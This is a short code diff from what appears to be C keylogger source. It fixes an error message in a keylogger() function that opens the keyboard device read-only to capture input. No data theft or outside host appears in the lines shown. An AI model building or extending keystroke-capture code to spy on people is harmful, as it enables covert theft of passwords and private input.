@@ -89,7 +89,7 @@ void keylogger()
     keyboard = open(KEYBOARD_DEVICE, O_RDONLY | O_NOCTTY);
     if (keyboard == -1)
     {
-        systemFatal("Unable to keyboard");
+        systemFatal("Unable to open keyboard");
         return;
     }
 #endif
